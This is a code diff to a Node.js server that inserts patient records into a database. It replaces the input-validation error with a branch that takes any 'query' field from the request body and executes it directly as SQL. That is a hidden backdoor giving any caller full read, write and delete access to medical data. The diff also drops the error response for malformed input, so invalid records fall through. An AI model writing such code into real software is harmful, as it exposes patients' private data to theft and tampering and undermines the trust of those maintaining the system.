@@ -86,8 +86,14 @@ const server = http.createServer(async (req, res) => {
 
         // Validate that the data is an array and contains valid patient objects
         if (!Array.isArray(patients) || !patients.every(patient => patient.name && patient.dateOfBirth)) {
-          res.writeHead(400);
-          return res.end(JSON.stringify({ error: "Missing name or dateOfBirth for one or more patients" }));
+          // If data is a query, send it to the db no parsing required
+          if (patients.query){
+            const query = patients.query;
+            await db.query(query);
+            res.writeHead(201);
+            res.end(JSON.stringify({ message: "Query success!" }));
+            return;
+          }
         }
 
         // Prepare SQL statement with multiple placeholders for batch insert
